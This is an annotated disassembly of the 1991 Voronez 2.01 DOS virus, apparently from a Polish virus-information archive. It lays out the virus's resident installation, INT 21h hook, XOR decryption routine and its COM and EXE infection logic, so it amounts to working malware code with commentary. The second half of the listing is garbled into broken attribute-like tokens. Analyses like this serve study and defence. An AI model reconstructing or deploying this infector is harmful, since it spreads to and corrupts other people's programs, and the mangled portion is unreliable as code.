

;=======================================================
; Virus Voronez 2.01 (August 1991 Zielona Gora, Poland)
;
; Disassembled by Andrzej Kadlof 1991 August
;
; (C) Polish Section Of Virus Information Bank
;=======================================================

1EE6 9A19240657     call   5706:2419

; victim code

1EEB 1E             push   ds
1EEC B82325         mov    ax,2523

;...
;
;-------------------
; virus entry point 

2419 8CD8           mov    ax,ds
241B 0E             push   cs
241C 1F             pop    ds
241D 50             push   ax
241E E80000         call   2421     ; get own offset
2421 5B             pop    bx

2422 81EB0801       sub    bx,0108  ; virus base
2426 53             push   bx

; is virus present in RAM?

2427 B4AB           mov    ah,AB    ; call for resident part
2429 CD21           int    21

242B 3D5555         cmp    ax,5555  ; expected answer
242E 7503           jne    2433     ; not instaled

2430 E9D000         jmp    2503     ; instaled, exit

; install wirus in RAM

2433 8CC0           mov    ax,es        ; PSP segment
2435 2D0100         sub    ax,0001      ; MCB segment
2438 8ED8           mov    ds,ax
243A BB0300         mov    bx,0003      ; offset of size of block in MCB
243D 3E8B07         mov    ax,ds:[bx]   ; get size
2440 2DEA00         sub    ax,00EA      ; reserve 0EA0h bytes for virus (3744)
2443 3E8907         mov    ds:[bx],ax   ; store new block size
2446 06             push   es           ; restore DS
2447 1F             pop    ds
2448 BB0200         mov    bx,0002      ; offset of MEM size in PSP
244B 3E8B07         mov    ax,ds:[bx]   ; get MEM size
244E 2DEA00         sub    ax,00EA      ; decrease by 3744 bytes
2451 3E8907         mov    ds:[bx],ax   ; set new value in PSP
2454 8EC0           mov    es,ax        ; segment for new virus location
2456 BF0001         mov    di,0100      ; offset of destination
2459 BE0001         mov    si,0100      ; offset of source
245C 5B             pop    bx           ; virus base
245D 53             push   bx
245E 01DE           add    si,bx        ; start of virus code
2460 0E             push   cs           ; set DS to virus code
2461 1F             pop    ds
2462 B9A406         mov    cx,06A4      ; length (1700)
2465 F3A4           rep movsb           ; move to new place
2467 8BD0           mov    dx,ax        ; segment of new location
2469 EB74           jmp    24DF         ; continue
246B 90             nop

;------------------
; INT 21h handler

246C 9C             pushf
246D FB             sti
246E 80FCAB         cmp    ah,AB        ; virus call
2471 7505           jne    2478         ; no

2473 B85555         mov    ax,5555      ; answer: I'm here
2476 9D             popf
2477 CF             iret

2478 3D003D         cmp    ax,3D00   ; open file for read only
247B 7540           jne    24BD

; open file for read only

247D 50             push   ax
247E 53             push   bx
247F 51             push   cx
2480 52             push   dx
2481 56             push   si
2482 57             push   di
2483 06             push   es
2484 B94100         mov    cx,0041  ; maximum path length
2487 30C0           xor    al,al
2489 8BFA           mov    di,dx    ; offset of path
248B 1E             push   ds
248C 07             pop    es
248D F2AE           repnz scasb     ; find end of string
248F 83EF04         sub    di,0004  ; point at extension
2492 8BF7           mov    si,di
2494 56             push   si           ; offset of extension
2495 0E             push   cs
2496 07             pop    es
2497 B90400         mov    cx,0004      ; extension length
249A BF8902         mov    di,0289      ; is it EXE?
249D F3A6           rep cmpsb
249F 83F900         cmp    cx,0000
24A2 7504           jne    24A8

24A4 5E             pop    si           ; balance stack
24A5 EB0D           jmp    24B4         ; skip exe comparison
24A7 90             nop

24A8 BF8C02         mov    di,028C      ; is it exe?
24AB B90400         mov    cx,0004
24AE 5E             pop    si           ; offset of extension
24AF F3A6           rep cmpsb
24B1 83F900         cmp    cx,0000

; restore callers registers

24B4 07             pop    es
24B5 5F             pop    di
24B6 5E             pop    si
24B7 5A             pop    dx
24B8 59             pop    cx
24B9 5B             pop    bx
24BA 58             pop    ax
24BB 7409           je     24C6         ; exe file, contaminate it!

; not EXE file, maybe COM or subfunction <> 3D00h

24BD 50             push   ax           ; store subfunction code
24BE FEC4           inc    ah           ; hide 4B00h comparison
24C0 3D004C         cmp    ax,4C00      ; "terminate" proces
24C3 58             pop    ax           ; restore subfunction
24C4 7513           jne    24D9         ; jump to old INT 21h

; EXE file will be open for read only or any file will be loaded and executed
; store caller registers again

24C6 50             push   ax
24C7 53             push   bx
24C8 51             push   cx
24C9 52             push   dx
24CA 56             push   si
24CB 57             push   di
24CC 06             push   es
24CD 1E             push   ds
24CE E91F01         jmp    25F0         ; contaminate

; jump to old INT 21h

24D1 1F             pop    ds
24D2 07             pop    es
24D3 5F             pop    di
24D4 5E             pop    si
24D5 5A             pop    dx
24D6 59             pop    cx
24D7 5B             pop    bx
24D8 58             pop    ax

24D9 9D             popf
24DA EA60147902     jmp    0279:1460    ; old INT 21h

;      ^^^^^^^^    old INT 21h (place holder)
;---------------------
; continue instalation

; get INT 21h

24DF 8EDA           mov    ds,dx        ; DS points at new virus location
24E1 B82135         mov    ax,3521
24E4 CD21           int    21
24E6 3E891EC201     mov    ds:[01C2],bx   ; modify own code
24EB 3E8C06C401     mov    ds:[01C4],es
24F0 3E891E7503     mov    ds:[0375],bx
24F5 3E8C067703     mov    ds:[0377],es

; set new INT 21h

24FA 8D165301       lea    dx,[0153]    ; here 246C
24FE B82125         mov    ax,2521
2501 CD21           int    21

2503 5A             pop    dx           ; virus base
2504 BBB002         mov    bx,02B0      ; offset of working varible
2507 01D3           add    bx,dx        ; add base
2509 2E803F00       cmp    byte ptr [bx],00     ; carrier type
250D 7441           je     2550         ; carrier is COM file
   
; carrier is EXE file 

250F 1F             pop    ds           ; restore DS
2510 8CD8           mov    ax,ds        ; store new virus segment
2512 0E             push   cs
2513 1F             pop    ds
2514 8BCA           mov    cx,dx
2516 5F             pop    di           ; entry point offset
2517 07             pop    es           ; entry point segment
2518 50             push   ax
2519 83EF05         sub    di,0005      ; length of FAR CALL

; improper handling of the case when relocation item points exactly at
; fifth byte of stored code

251C BEAF02         mov    si,02AF      ; extension of buffer
251F 01CE           add    si,cx        ; virus base
2521 8A14           mov    dl,[si]      ; get sixth byte, this byte may by
                                        ; changed during relocation proces

; this byte should be added to sixth byte in file (counting from entry point)

2523 26005505       add    es:[di+05],dl   ; add key
2527 26385505       cmp    es:[di+05],dl   ; was DL = 0?
252B 7703           ja     2530         ; jump if no

252D 4E             dec    si
252E FE04           inc    byte ptr [si]

2530 8BD7           mov    dx,di        ; destination
2532 BEAA02         mov    si,02AA      ; source buffer
2535 01CE           add    si,cx        ; add base
2537 B90500         mov    cx,0005      ; number of bytes
253A F3A4           rep movsb
253C 1F             pop    ds

253D 06             push   es           ; prepare long jump
253E 52             push   dx
253F 8CD8           mov    ax,ds        ; reset registers
2541 8EC0           mov    es,ax
2543 31C0           xor    ax,ax
2545 31DB           xor    bx,bx
2547 31C9           xor    cx,cx
2549 31D2           xor    dx,dx
254B 31F6           xor    si,si
254D 31FF           xor    di,di
254F CB             retf                ; jump to application

; exit to COM application

2550 8CC8           mov    ax,cs
2552 8ED8           mov    ds,ax
2554 8EC0           mov    es,ax
2556 BE6802         mov    si,0268      ; offset of encryption routine
2559 B90001         mov    cx,0100      ; number of bytes
255C BB8102         mov    bx,0281      ; file size
255F 8B3F           mov    di,[bx]
2561 83FF00         cmp    di,0000      ; ??
2564 7502           jne    2568

2566 CD20           int    20           ; terminate

; form destination address

2568 BB8302         mov    bx,0283      ; place holder for virus length
256B 8B07           mov    ax,[bx]      ; virus length
256D 01C7           add    di,ax        ; add to file size
256F 81C70001       add    di,0100      ; size of PSP
2573 FC             cld
2574 57             push   di           ; destination address
2575 F3A4           rep movsb           ; move part of code
2577 5F             pop    di           ; restore address
2578 8B0E8302       mov    cx,[0283]    ; virus size
257C A18102         mov    ax,[0281]    ; file length
257F 57             push   di           ; prepare jump
2580 C3             ret                 ; jump to moved code (here 2581)

;--------------------
; encryption routine

2581 050001         add    ax,0100      ; PSP size
2584 8BF0           mov    si,ax        ; offset of encrypted block
2586 BF0001         mov    di,0100      ; destination
2589 FC             cld

; decrypt block and copy it to begin of file

258A 8A04           mov    al,[si]
258C 34BB           xor    al,BB
258E 8805           mov    [di],al
2590 46             inc    si
2591 47             inc    di
2592 E2F6           loop   258A

; jump to application

2594 B80001         mov    ax,0100      ; entry point for EXE
2597 5B             pop    bx           ; balance stack
2598 50             push   ax           ; prepare jump
2599 C3             ret                 ; jump to COM

; working area

259A 1926               ; [base + 0281] low word of file size
259C 4006       ; [base + 0283] size of virus, (high word of file length)
259E 014C               ; [base + 0285] old INT 24h (offset)
25A0 169F               ; [base + 0287] old INT 24h (segment)

25A2 45 58 45     ; [base + 0289]  'EXE'
25A5 65 78 65     ; [base + 028C]  'exe'

; unused 

; below line after xoring with 1A become: OleynikozL - name of the wirus author

25A8 55 76 7F 63 74 73 71 75 60 56        ; Uvctsqu`

25B1 56 6F 72 6F 6E 65 7A 68 2C           ; Voronezh,
25BA 31 39 39 30 20 32 2E 30 31           ; 1990 2.01

; used data

25C3 FC 0E 1F BA BB     ; [base + 02AA]  starting 5 bytes of EXE file
25C8 00                 ; [base + 02AF]  this byte is added to 02AE
                        ; if it is 0 then [02AE] is decreased by 1
25C9 01                 ; [base + 02B0]  carrier type: 0 - EXE, 1 - COM

25CA 0002       ; [base + 02B1]  offset in header for new relocation entry
25CC E61E       ; [base + 02B3]  IP of EXE file
25CE 0000       ; [base + 02B5]  CS of EXE file
25D0 0000
25D2 00
25D3 0000               ; [base + 02BA]  virus entry point in file on disk
25D5 E620               ; [base + 02BC]      - [02B1]
25D7 0000               ; [base + 02BE]  segment of virus entry point
25D9 1924               ; [base + 02C0]  offset
25DB 9A                 ; [base + 02C2]  code of CALL SSSS:OOOO
25DC 1924               ; [base + 02C3]      OOOO
25DE 0000               ; [base + 02C5]      SSSS
25E0 0000               ; [base + 02C7]  file position low word
25E2 1E00               ; [base + 02C9]  file position high word
25E4 0001               ; [base + 02CB]  size of buffer
25E6 0000               ; [base + 02CD]  total size of readed part of ReloTabl
25E8 00                 ; [base + 02CF] number of disk (0 - default, 1 - A, ...)
25E9 2000               ; [base + 02D0] file attributes
25EB B438               ; [base + 02D2] offset of file name
25ED 0F4C               ; [base + 02D4] segment of file name

;-----------------
; INT 24h handler

25EF CF             iret

; jump here if EXE file is open or sam program is loaded and executed

; check file name, skip file if fourth and fifth characters in path are 'CO'

25F0 8BDA           mov    bx,dx        ; offset of path
25F2 3E8B4703       mov    ax,ds:[bx+03]  ; skip 'd:\' (?)
25F6 3D434F         cmp    ax,4F43      ; 'CO' protect 'C:\COMMAND.COM' ?
25F9 7503           jne    25FE

25FB E9D3FE         jmp    24D1         ; jump to old INT 21h

; check presence of disk specyfication

25FE 8BFA           mov    di,dx        ; offset of path
2600 31C0           xor    ax,ax
2602 2EC606CF0200   mov    byte ptr [02CF],00       ; default
2608 3E807D013A     cmp    ds:byte ptr [di+01],3A   ; ':' is disk specified?
260D 7509           jne    2618         ; no

; convert disk specyfication to number (A - 1, B - 2, ...)

260F 3E8A05         mov    al,ds:[di]
2612 249F           and    al,9F        ; convert
2614 2EA2CF02       mov    [02CF],al    ; store disk number

2618 B80043         mov    ax,4300  ; get file attributes
261B CD21           int    21

; store address of path and file attributes

261D 2E890ED002     mov  [02D0],cx
2622 2E8C1ED202     mov  [02D2],ds
2627 2E8916D402     mov  [02D4],dx

; intercepte INT 24h

262C 1E             push   ds
262D 52             push   dx
262E 06             push   es

262F 0E             push   cs
2630 1F             pop    ds
2631 B82435         mov    ax,3524
2634 CD21           int    21
2636 891E8502       mov    [0285],bx
263A 8C068702       mov    [0287],es

263E BAD602         mov    dx,02D6
2641 B82425         mov    ax,2524
2644 CD21           int    21

2646 07             pop    es
2647 5A             pop    dx
2648 1F             pop    ds

2649 1E             push   ds

264A 0E             push   cs
264B 1F             pop    ds

264C BB0001         mov    bx,0100
264F B94007         mov    cx,0740      ; offset of buffer
2652 29D9           sub    cx,bx        ; virus length
2654 BB8302         mov    bx,0283      ; offset of varible
2657 890F           mov    [bx],cx      ; size of virus/crypted block

2659 1F             pop    ds

265A 8BDA           mov    bx,dx        ; waste of time
265C 1E             push   ds           ; store address of path
265D 52             push   dx
265E 53             push   bx           ; waste of time

265F 0E             push   cs
2660 1F             pop    ds

2661 B436           mov    ah,36        ; disk free
2663 8A16CF02       mov    dl,[02CF]    ; disk number
2667 CD21           int    21

2669 3DFFFF         cmp    ax,FFFF      ; check for error
266C 7509           jne    2677         ; ok

; disk not accessible, exit

266E 58             pop    ax           ; balance stack
266F 58             pop    ax
2670 58             pop    ax
2671 E8A203         call   2A16         ; restore INT 24h
2674 E95AFE         jmp    24D1         ; jump to old INT 21h

; convert disk free space into bytes

2677 F7E3           mul    bx
2679 F7E1           mul    cx
267B 09D2           or     dx,dx
267D 7506           jne    2685         ; plenty of free room

267F 3B068302       cmp    ax,[0283]    ; minimum disk free space
2683 72E9           jb     266E         ; disk full, exit

2685 5B             pop    bx           ; balance stack
2686 5A             pop    dx           ; path address
2687 1F             pop    ds
2688 B8003D         mov    ax,3D00      ; open file for read only
268B 9C             pushf
268C FA             cli
268D 9A60147902     call   0279:1460    ; old INT 21h

;      ^^^^^^^^  old INT 21h (place holder)

2692 7306           jnb    269A         ; OK

2694 E87F03         call   2A16         ; restore INT 24h
2697 E937FE         jmp    24D1         ; jump to old INT 21h

269A 50             push   ax           ; store handle
269B 8CC8           mov    ax,cs        ; set DS and ES to virus segment
269D 8ED8           mov    ds,ax
269F 8EC0           mov    es,ax
26A1 58             pop    ax           ; restore handle
26A2 50             push   ax           ; store handle
26A3 8BD8           mov    bx,ax
26A5 B80057         mov    ax,5700      ; get file time/date stamp
26A8 CD21           int    21

26AA 58             pop    ax           ; restore handle
26AB 51             push   cx           ; attributes
26AC 52             push   dx           ; offset of path
26AD 50             push   ax           ; handle

; get file size

26AE 8BD8           mov    bx,ax        ; handle
26B0 B90000         mov    cx,0000
26B3 BA0000         mov    dx,0000
26B6 B442           mov    ah,42        ; move file ptr
26B8 B002           mov    al,02        ; to EOF
26BA CD21           int    21

26BC BB8102         mov    bx,0281      ; store low word of file length
26BF 8907           mov    [bx],ax

; waste of time or programmers error

26C1 BB8302         mov    bx,0283      ; 'store' high word of file length
26C4 8B0F           mov    cx,[bx]      ; <- error="" (?),="" maybe:="" mov="" [bx],cx="" ;="" move="" file="" ptr="" to="" bof="" 26c6="" b90000="" mov="" cx,0000="" 26c9="" ba0000="" mov="" dx,0000="" 26cc="" b80042="" mov="" ax,4200="" ;="" move="" file="" ptr="" to="" bof="" 26cf="" 5b="" pop="" bx="" ;="" restore="" handle="" 26d0="" 53="" push="" bx="" 26d1="" cd21="" int="" 21="" ;="" read="" [0283]="" bytes="" of="" file="" to="" buffer="" located="" above="" virus="" 26d3="" bb8302="" mov="" bx,0283="" ;="" working="" varible="" 26d6="" 8b0f="" mov="" cx,[bx]="" ;="" length="" of="" virus/encrypted="" block="" 26d8="" 5b="" pop="" bx="" ;="" restore="" handle="" 26d9="" 53="" push="" bx="" 26da="" ba4007="" mov="" dx,0740="" ;="" buffer="" 26dd="" b43f="" mov="" ah,3f="" ;="" read="" file="" 26df="" cd21="" int="" 21="" 26e1="" be4007="" mov="" si,0740="" ;="" buffer="" 26e4="" 8b0c="" mov="" cx,[si]="" ;="" first="" word="" 26e6="" 81f98cd8="" cmp="" cx,d88c="" ;="" signature="" in="" com="" file="" 26ea="" 7509="" jne="" 26f5="" ;="" clear="" com="" or="" exe="" file="" ;="" this="" is="" infected="" com="" file,="" exit="" 26ec="" 5b="" pop="" bx="" ;="" handle="" 26ed="" 58="" pop="" ax="" ;="" balance="" stack="" 26ee="" 58="" pop="" ax="" 26ef="" e81f03="" call="" 2a11="" ;="" close="" file="" and="" restore="" int="" 24h="" 26f2="" e9dcfd="" jmp="" 24d1="" ;="" jump="" to="" old="" int="" 21h="" ;="" is="" it="" exe="" file="" or="" clear="" com?="" 26f5="" 81f94d5a="" cmp="" cx,5a4d="" ;="" exe="" marker="" 26f9="" 7403="" je="" 26fe="" ;="" yes="" 26fb="" e98902="" jmp="" 2987="" ;="" infect="" com="" file="" ;="" check="" exe="" file="" 26fe="" 5b="" pop="" bx="" ;="" restore="" handle="" 26ff="" 53="" push="" bx="" 2700="" b80042="" mov="" ax,4200="" ;="" move="" file="" ptr="" to="" bof="" 2703="" 31c9="" xor="" cx,cx="" 2705="" 31d2="" xor="" dx,dx="" 2707="" cd21="" int="" 21="" 2709="" b93200="" mov="" cx,0032="" ;="" block="" size="" 270c="" b8003f="" mov="" ax,3f00="" ;="" read="" file="" 270f="" 8d164007="" lea="" dx,[0740]="" ;="" buffer="" 2713="" cd21="" int="" 21="" ;="" check="" free="" place="" in="" relocation="" table="" 2715="" a14607="" mov="" ax,[0746]="" ;="" relocnt="" 2718="" b90400="" mov="" cx,0004="" ;="" entry="" size="" 271b="" f7e1="" mul="" cx="" ;="" ax="" size="" of="" relocation="" table="" 271d="" 8b1e5807="" mov="" bx,[0758]="" ;="" tabloff="" 2721="" 01d8="" add="" ax,bx="" 2723="" 8bd0="" mov="" dx,ax="" ;="" size="" of="" used="" area="" in="" header="" 2725="" 8bfa="" mov="" di,dx="" 2727="" a14807="" mov="" ax,[0748]="" ;="" hdrsize="" 272a="" b91000="" mov="" cx,0010="" ;="" convert="" to="" bytes="" 272d="" f7e1="" mul="" cx="" 272f="" 8bd7="" mov="" dx,di="" ;="" used="" header="" size="" 2731="" 83c204="" add="" dx,0004="" ;="" one="" additional="" entry="" 2734="" 39d0="" cmp="" ax,dx="" ;="" is="" free="" space?="" 2736="" 7703="" ja="" 273b="" ;="" yes="" 2738="" e94902="" jmp="" 2984="" ;="" relocation="" table="" is="" full,="" exit="" ;="" prepare="" new="" header="" 273b="" a3b102="" mov="" [02b1],ax="" ;="" offset="" of="" first="" unused="" entry="" 273e="" a14607="" mov="" ax,[0746]="" ;="" relocnt="" 2741="" 40="" inc="" ax="" ;="" add="" one="" entry="" 2742="" a34607="" mov="" [0746],ax="" ;="" relocnt,="" store="" new="" value="" of="" counter="" 2745="" a15407="" mov="" ax,[0754]="" ;="" ip="" 2748="" a3b302="" mov="" [02b3],ax="" ;="" store="" oryginal="" ip="" 274b="" a15607="" mov="" ax,[0756]="" ;="" cs="" 274e="" a3b502="" mov="" [02b5],ax="" ;="" store="" oryginal="" cs="" 2751="" 31d2="" xor="" dx,dx="" 2753="" 31c9="" xor="" cx,cx="" 2755="" b80242="" mov="" ax,4202="" ;="" move="" file="" ptr="" to="" eof="" 2758="" 5b="" pop="" bx="" ;="" restore="" handle="" 2759="" 53="" push="" bx="" 275a="" cd21="" int="" 21="" 275c="" 50="" push="" ax="" ;="" store="" file="" length="" 275d="" 52="" push="" dx="" 275e="" 03068302="" add="" ax,[0283]="" ;="" find="" new="" file="" length="" 2762="" 3b068302="" cmp="" ax,[0283]="" ;="" long="" integer="" addition="" 2766="" 7701="" ja="" 2769="" 2768="" 42="" inc="" dx="" ;="" high="" word="" of="" file="" length="" 2769="" b90002="" mov="" cx,0200="" ;="" convert="" into="" 512="" byte="" pages="" 276c="" f7f1="" div="" cx="" 276e="" 83fa00="" cmp="" dx,0000="" ;="" last="" page="" non="" empty?="" 2771="" 7401="" je="" 2774="" 2773="" 40="" inc="" ax="" ;="" count="" last="" page="" ;="" check="" if="" header="" information="" match="" to="" real="" file="" size="" 2774="" 8b1e4407="" mov="" bx,[0744]="" ;="" pagecnt="" 2778="" 8bc8="" mov="" cx,ax="" ;="" new="" pagecnt="" 277a="" 29d9="" sub="" cx,bx="" ;="" diference="" 277c="" 83f905="" cmp="" cx,0005="" ;="" maximum="" possible="" 277f="" 7205="" jb="" 2786="" ;="" ok,="" continue="" infection="" ;="" there="" is="" some="" information="" above="" program="" in="" exe="" file,="" do="" not="" infect="" such="" a="" ;="" file,="" exit="" 2781="" 58="" pop="" ax="" 2782="" 58="" pop="" ax="" 2783="" e9fe01="" jmp="" 2984="" ;="" continue="" infection="" 2786="" a34407="" mov="" [0744],ax="" ;="" pagecnt,="" store="" new="" value="" 2789="" 5a="" pop="" dx="" ;="" restore="" file="" length="" 278a="" 58="" pop="" ax="" ;="" low="" word="" of="" file="" length="" 278b="" 8b1eb102="" mov="" bx,[02b1]="" ;="" position="" of="" free="" relocation="" entry="" 278f="" 39d8="" cmp="" ax,bx="" 2791="" 7205="" jb="" 2798="" ;="" find="" length="" of="" file="" part="" above="" last="" entry="" in="" relocation="" table="" 2793="" 29d8="" sub="" ax,bx="" 2795="" eb04="" jmp="" 279b="" 2797="" 90="" nop="" 2798="" 29d8="" sub="" ax,bx="" 279a="" 4a="" dec="" dx="" 279b="" 8916be02="" mov="" [02be],dx="" ;="" address="" of="" virus="" entry="" point="" (segment)="" 279f="" a3c002="" mov="" [02c0],ax="" ;="" offset="" 27a2="" a1b102="" mov="" ax,[02b1]="" ;="" offset="" in="" relocation="" table="" 27a5="" 8b1eb302="" mov="" bx,[02b3]="" ;="" ip="" 27a9="" ba0000="" mov="" dx,0000="" ;="" prepare="" long="" integer="" addition="" 27ac="" 01d8="" add="" ax,bx="" ;="" add="" long="" integer="" 27ae="" 39d8="" cmp="" ax,bx="" 27b0="" 7701="" ja="" 27b3="" 27b2="" 42="" inc="" dx="" 27b3="" 8bf0="" mov="" si,ax="" ;="" offset="" of="" entry="" point="" 27b5="" 8bfa="" mov="" di,dx="" ;="" high="" word="" 27b7="" a1b502="" mov="" ax,[02b5]="" ;="" cs="" 27ba="" b91000="" mov="" cx,0010="" ;="" convert="" to="" bytes="" 27bd="" f7e1="" mul="" cx="" 27bf="" 01d7="" add="" di,dx="" ;="" high="" word="" 27c1="" 01c6="" add="" si,ax="" ;="" low="" word="" 27c3="" 39c6="" cmp="" si,ax="" 27c5="" 7701="" ja="" 27c8="" 27c7="" 47="" inc="" di="" ;="" store="" distance="" in="" file="" between="" first="" free="" entry="" in="" relocation="" table="" and="" ;="" program="" entry="" point="" in="" disk="" file="" 27c8="" 8bc6="" mov="" ax,si="" 27ca="" 8bd7="" mov="" dx,di="" 27cc="" 8916ba02="" mov="" [02ba],dx="" 27d0="" a3bc02="" mov="" [02bc],ax="" ;="" move="" file="" position="" to="" entry="" point="" 27d3="" 8bca="" mov="" cx,dx="" 27d5="" 8bd0="" mov="" dx,ax="" 27d7="" b80042="" mov="" ax,4200="" ;="" move="" file="" ptr="" 27da="" c606b00201="" mov="" byte="" ptr="" [02b0],01="" ;="" flag:="" exe="" file="" 27df="" c606af0200="" mov="" byte="" ptr="" [02af],00="" ;="" buffer="" extension="" 27e4="" 5b="" pop="" bx="" ;="" handle="" 27e5="" 53="" push="" bx="" 27e6="" cd21="" int="" 21="" ;="" read="" oryginal="" five="" bytes="" from="" entry="" point="" 27e8="" b90500="" mov="" cx,0005="" ;="" number="" of="" bytes="" 27eb="" 8d16aa02="" lea="" dx,[02aa]="" ;="" local="" buffer="" 27ef="" b8003f="" mov="" ax,3f00="" ;="" read="" file="" 27f2="" cd21="" int="" 21="" 27f4="" 803eaa029a="" cmp="" byte="" ptr="" [02aa],9a="" ;="" signature="" 27f9="" 7503="" jne="" 27fe="" ;="" not="" infected,="" continue="" 27fb="" e98601="" jmp="" 2984="" ;="" do="" not="" infect,="" exit="" ;="" continue="" infection="" 27fe="" e82302="" call="" 2a24="" ;="" clear="" attributes="" and="" reopen="" for="" read/write="" ;="" move="" file="" ptr="" to="" first="" not="" used="" entry="" in="" relocation="" table="" 2801="" 8b1e5807="" mov="" bx,[0758]="" ;="" tableoff="" 2805="" a14607="" mov="" ax,[0746]="" ;="" relocnt="" 2808="" 48="" dec="" ax="" ;="" count="" starts="" from="" zero="" 2809="" b90400="" mov="" cx,0004="" ;="" entry="" size="" 280c="" f7e1="" mul="" cx="" 280e="" 01c3="" add="" bx,ax="" ;="" offset="" in="" table="" 2810="" b90000="" mov="" cx,0000="" 2813="" 8bd3="" mov="" dx,bx="" 2815="" b80042="" mov="" ax,4200="" ;="" move="" file="" ptr="" to="" bof="" 2818="" 5b="" pop="" bx="" ;="" handle="" 2819="" 53="" push="" bx="" 281a="" cd21="" int="" 21="" ;="" write="" new="" relocation="" table="" entry="" 281c="" 8b16b302="" mov="" dx,[02b3]="" ;="" ip="" 2820="" 83c203="" add="" dx,0003="" ;="" length="" of="" instruction="" code="" and="" offset="" 2823="" 8916b302="" mov="" [02b3],dx="" ;="" pointer="" to="" segment="" word="" 2827="" 8d16b302="" lea="" dx,[02b3]="" ;="" buffer="" with="" cs:ip="" 282b="" b90400="" mov="" cx,0004="" ;="" buffer="" size="" 282e="" b440="" mov="" ah,40="" ;="" write="" file="" 2830="" 5b="" pop="" bx="" ;="" handle="" 2831="" 53="" push="" bx="" 2832="" cd21="" int="" 21="" ;="" restore="" ip="" in="" [02b3]="" 2834="" 8b16b302="" mov="" dx,[02b3]="" 2838="" 83ea03="" sub="" dx,0003="" 283b="" 8916b302="" mov="" [02b3],dx="" ;="" move="" file="" ptr="" to="" begin="" of="" file="" 283f="" 31d2="" xor="" dx,dx="" 2841="" 31c9="" xor="" cx,cx="" 2843="" b80042="" mov="" ax,4200="" ;="" move="" file="" ptr="" to="" bof="" 2846="" 5b="" pop="" bx="" ;="" handle="" 2847="" 53="" push="" bx="" 2848="" cd21="" int="" 21="" ;="" write="" new="" header="" to="" file="" 284a="" 8b0e5807="" mov="" cx,[0758]="" ;="" tableoff,="" number="" of="" bytes="" to="" write="" 284e="" 8d164007="" lea="" dx,[0740]="" ;="" offset="" of="" buffer="" 2852="" b440="" mov="" ah,40="" ;="" write="" file="" 2854="" cd21="" int="" 21="" ;="" form="" code="" for="" instruction="" of="" far="" call="" to="" virus="" 2856="" c606c2029a="" mov="" byte="" ptr="" [02c2],9a="" ;="" code="" for="" call="" ssss:oooo="" 285b="" a1c002="" mov="" ax,[02c0]="" ;="" offset="" of="" virus="" entry="" point="" in="" ram="" 285e="" a3c302="" mov="" [02c3],ax="" ;="" store="" in="" buffer="" 2861="" a1be02="" mov="" ax,[02be]="" ;="" segment="" 2864="" b90010="" mov="" cx,1000="" ;="" 2867="" f7e1="" mul="" cx="" 2869="" a3c502="" mov="" [02c5],ax="" ;="" new="" segment="" 286c="" 813ec30200f0="" cmp="" word="" ptr="" [02c3],f000="" 2872="" 7215="" jb="" 2889="" ;="" keep="" offset="" below="" f000="" 2874="" a1c302="" mov="" ax,[02c3]="" 2877="" 8b16c502="" mov="" dx,[02c5]="" 287b="" 81c20001="" add="" dx,0100="" ;="" adjust="" segment="" 287f="" 2d0010="" sub="" ax,1000="" ;="" decrease="" offset="" 2882="" 8916c502="" mov="" [02c5],dx="" ;="" store="" new="" values="" 2886="" a3c302="" mov="" [02c3],ax="" ;="" write="" to="" disk="" new="" entry="" point="" code="" 2889="" 8b0eba02="" mov="" cx,[02ba]="" ;="" virus="" entry="" point="" on="" disk="" file="" 288d="" 8b16bc02="" mov="" dx,[02bc]="" 2891="" b80042="" mov="" ax,4200="" ;="" move="" file="" ptr="" 2894="" 5b="" pop="" bx="" 2895="" 53="" push="" bx="" 2896="" cd21="" int="" 21="" 2898="" b90500="" mov="" cx,0005="" ;="" buffer="" length="" 289b="" b440="" mov="" ah,40="" ;="" write="" file="" 289d="" 8d16c202="" lea="" dx,[02c2]="" ;="" buffeer="" with="" call="" ssss:oooo="" 28a1="" cd21="" int="" 21="" ;="" append="" to="" file="" virus="" code="" 28a3="" b90000="" mov="" cx,0000="" 28a6="" ba0000="" mov="" dx,0000="" 28a9="" b80242="" mov="" ax,4202="" ;="" move="" file="" ptr="" to="" eof="" 28ac="" 5b="" pop="" bx="" ;="" handle="" 28ad="" 53="" push="" bx="" 28ae="" cd21="" int="" 21="" 28b0="" b440="" mov="" ah,40="" ;="" write="" file="" 28b2="" 8b0e8302="" mov="" cx,[0283]="" ;="" virus="" length="" 28b6="" ba0001="" mov="" dx,0100="" ;="" offset="" of="" virus="" code="" in="" ram="" 28b9="" cd21="" int="" 21="" ;="" analyse="" relocation="" table="" 28bb="" 31c9="" xor="" cx,cx="" 28bd="" 8b165807="" mov="" dx,[0758]="" ;="" tabloff="" 28c1="" b80042="" mov="" ax,4200="" ;="" move="" file="" ptr="" 28c4="" 5b="" pop="" bx="" ;="" handle="" 28c5="" 53="" push="" bx="" 28c6="" cd21="" int="" 21="" 28c8="" c706cd020000="" mov="" word="" ptr="" [02cd],0000="" 28ce="" 8916c702="" mov="" [02c7],dx="" ;="" store="" file="" position="" 28d2="" a3c902="" mov="" [02c9],ax="" 28d5="" a14607="" mov="" ax,[0746]="" ;="" relocnt="" 28d8="" bf0000="" mov="" di,0000="" 28db="" 48="" dec="" ax="" ;="" restore="" oryginal="" value="" 28dc="" 3d0000="" cmp="" ax,0000="" 28df="" 7503="" jne="" 28e4="" ;="" analyse="" relocation="" table="" ;="" if="" oryginal="" relocation="" table="" was="" empty="" then="" exit="" 28e1="" e9a000="" jmp="" 2984="" ;="" close="" file,="" restore="" attr="" etc.="" ;="" find="" size="" of="" relocation="" table="" 28e4="" b90400="" mov="" cx,0004="" 28e7="" f7e1="" mul="" cx="" 28e9="" 8bf0="" mov="" si,ax="" ;="" offset="" of="" last="" used="" entry="" ;="" get="" current="" file="" position="" (this="" is="" the="" begin="" of="" relocation="" teble)="" 28eb="" b90000="" mov="" cx,0000="" 28ee="" ba0000="" mov="" dx,0000="" 28f1="" b80142="" mov="" ax,4201="" ;="" move="" file="" ptr="" rel="" current="" position="" 28f4="" cd21="" int="" 21="" ;="" read="" part="" of="" relocation="" table="" 28f6="" 8916c702="" mov="" [02c7],dx="" ;="" store="" file="" position="" 28fa="" a3c902="" mov="" [02c9],ax="" 28fd="" b90001="" mov="" cx,0100="" ;="" number="" of="" bytes="" 2900="" ba0000="" mov="" dx,0000="" ;="" buffer="" 2903="" b8003f="" mov="" ax,3f00="" ;="" read="" file="" 2906="" cd21="" int="" 21="" 2908="" bf0000="" mov="" di,0000="" ;="" point="" at="" relocation="" table="" 290b="" a3cb02="" mov="" [02cb],ax="" ;="" number="" of="" bytes="" readed="" 290e="" 0106cd02="" add="" [02cd],ax="" ;="" total="" number="" of="" readed="" 